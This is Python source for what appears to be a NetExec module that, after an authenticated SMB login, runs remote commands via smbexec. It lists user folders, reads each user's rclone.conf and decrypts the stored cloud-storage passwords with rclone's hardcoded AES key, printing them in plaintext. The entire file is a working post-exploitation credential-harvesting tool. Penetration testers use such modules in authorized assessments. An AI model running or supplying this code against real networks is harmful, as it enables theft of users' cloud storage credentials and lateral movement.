import base64
from Crypto.Cipher import AES

SECRET_KEY = b"\x9c\x93\x5b\x48\x73\x0a\x55\x4d\x6b\xfd\x7c\x63\xc8\x86\xa9\x2b\xd3\x90\x19\x8e\xb8\x12\x8a\xfb\xf4\xde\x16\x2b\x8b\x95\xf6\x38"

def base64_urlsafedecode(string):
    padding = 4 - (len(string) % 4)
    string += "=" * padding
    return base64.urlsafe_b64decode(string)

def deobscure(obscured):
    encrypted_password = base64_urlsafedecode(obscured)
    iv = encrypted_password[:AES.block_size]
    buf = encrypted_password[AES.block_size:]
    crypter = AES.new(key=SECRET_KEY, mode=AES.MODE_CTR, initial_value=iv, nonce=b"")
    return crypter.decrypt(buf).decode("utf-8")

class NXCModule:
    name = "rclone"
    description = "Searches for rclone.conf and deobscures credentials"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    privilege = True

    def options(self, context, module_options):
        """There are no module options."""

    def on_login(self, context, connection):
        try:
            output = connection.execute("dir C:\\Users", True, methods=["smbexec"])
        except Exception as e:
            context.log.error(f"Failed to list C:\\Users: {e}")
            return False

        if not output:
            context.log.error("No output from dir C:\\Users")
            return False

        usernames = self.parse_user_dirs(output)
        if not usernames:
            context.log.warning("No user directories found.")
            return False

        for username in usernames:
            rclone_path = f"C:\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
            context.log.info(f"Trying to read: {rclone_path}")

            try:
                file_output = connection.execute(f"type {rclone_path}", True, methods=["smbexec"])
            except Exception as e:
                context.log.debug(f"[{username}] Failed to read {rclone_path}: {e}")
                continue

            if not file_output or "The system cannot find the path specified." in file_output:
                context.log.info(f"[{username}] rclone.conf not found.")
                continue

            decoded = file_output
            if "# Encrypted rclone configuration file" in decoded:
                context.log.info(f"[{username}] Encrypted config — skipping.")
                continue

            context.log.success(f"[{username}] rclone.conf found!")

            for line in decoded.splitlines():
                if "=" not in line:
                    context.log.highlight(line.strip())
                    continue

                key, val = map(str.strip, line.split("=", 1))
                if key.lower() in ("pass", "password", "password2"):
                    try:
                        plain = deobscure(val)
                        context.log.highlight(f"{key} = {plain}")
                    except Exception as e:
                        context.log.warning(f"[{username}] Failed to deobscure {key}: {e}")
                else:
                    context.log.highlight(line.strip())

        return True

    def parse_user_dirs(self, output):
        usernames = []
        skip_dirs = {"Public", "Default", "Default User", "All Users"}

        for line in output.splitlines():
            parts = line.split()
            if len(parts) < 5:
                continue

            folder_name = parts[-1]
            if folder_name in skip_dirs or folder_name in [".", ".."]:
                continue

            usernames.append(folder_name)

        return usernames
